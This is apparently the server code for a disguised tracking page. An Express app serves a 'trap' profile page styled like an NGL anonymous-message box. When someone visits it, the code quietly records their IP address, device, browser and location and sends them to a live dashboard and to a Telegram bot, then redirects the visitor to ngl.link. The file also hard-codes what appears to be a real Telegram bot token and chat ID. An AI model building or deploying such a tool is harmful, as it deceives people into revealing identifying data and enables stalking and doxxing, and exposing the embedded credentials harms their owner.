const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');
const axios = require('axios'); // Telegram ပို့ရန်အတွက်

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ⚙️ TELEGRAM CONFIGURATION (မိတ်ဆွေ၏ အချက်အလက်များဖြင့် အစားထိုးပါ)
const TELEGRAM_BOT_TOKEN = '8636417611:AAFfLGJQFu3xDXxmnghRTHX3DTuP7TiNeQg';
const TELEGRAM_CHAT_ID = '7664679859';

let activeWalls = {};

// 🏠 Route: Main Dashboard Page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 🪤 Route: The Masked Trap Profile Page
app.get('/social-vibe/:username', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 📡 API: Telegram ရော Live Dashboard ဆီပါ ဒေတာပို့မည့် Endpoint
app.post('/api/vibecheck/:username', async (req, res) => {
    const targetUser = req.params.username.toLowerCase();
    const wall = activeWalls[targetUser];

    const userAgent = req.headers['user-agent'] || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = (rawIp === '::1' || rawIp === '127.0.0.1') ? '103.25.140.0' : rawIp.split(',')[0]; 

    const timestamp = new Date().toLocaleString();
    const device = parseDevice(userAgent);
    const browser = parseBrowser(userAgent);
    const locationData = req.body.location || "Unknown Location";

    const logEntry = {
        id: Math.random().toString(36).substring(2, 9),
        timestamp: timestamp,
        device: device,
        browser: browser,
        ip: clientIp,
        location: locationData
    };

    // RAM ပေါ်တွင် သိမ်းဆည်းခြင်း
    if (wall) {
        wall.logs.unshift(logEntry);
        if (wall.ownerSocketId) {
            io.to(wall.ownerSocketId).emit('stalkerDetected', logEntry);
        }
    }

    // 🤖 TELEGRAM REAL-TIME NOTIFICATION LOGIC
    const telegramMessage = `
⚠️ *STALKER INTERCEPTED!* 👁️
───────────────────
👤 *Target Account:* ${targetUser.toUpperCase()}
⏰ *Time:* ${timestamp}
📱 *Device/OS:* ${device}
🌐 *Browser:* ${browser}
💻 *IP Address:* \`${clientIp}\`
📍 *Specs & Location:* ${locationData}
───────────────────
_Protected via Cyber Vibe Trap Core_
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
        });
        console.log("🚀 Telegram Alert Sent Successfully!");
    } catch (teleErr) {
        console.error("❌ Telegram API Error: ", teleErr.message);
    }

    // NGL Box ပုံစံဖြစ်၍ Message ပို့ပြီးကြောင်း ပြသရန် Response ပြန်မည်
    res.json({ status: "Success", redirectUrl: "https://ngl.link" });
});

// Helper Functions for Device Parsing
function parseDevice(ua) {
    if (/android/i.test(ua)) return "Android Phone/Tablet";
    if (/iPad|iPhone|iPod/.test(ua)) return "Apple iOS Device (iPhone/iPad)";
    if (/windows/i.test(ua)) return "Windows PC";
    if (/macintosh/i.test(ua)) return "MacBook/iMac";
    return "Unknown Device OS";
}

function parseBrowser(ua) {
    if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) return "Google Chrome";
    if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) return "Apple Safari";
    if (/firefox|fxios/i.test(ua)) return "Mozilla Firefox";
    if (/edge|edg/i.test(ua)) return "Microsoft Edge";
    return "Webview Browser / Unknown";
}

// Socket Connections
io.on('connection', (socket) => {
    socket.on('registerOwner', (alias) => {
        if (!activeWalls[alias]) activeWalls[alias] = { ownerSocketId: socket.id, logs: [] };
        else activeWalls[alias].ownerSocketId = socket.id;
        socket.emit('initLogs', activeWalls[alias].logs);
    });
    socket.on('disconnect', () => {
        for (let alias in activeWalls) {
            if (activeWalls[alias].ownerSocketId === socket.id) {
                activeWalls[alias].ownerSocketId = null;
            }
        }
    });
});

const PORT = process.env.PORT || 5000;
http.listen(PORT, () => console.log(`🚀 Advanced Spy Core Active on port ${PORT}`));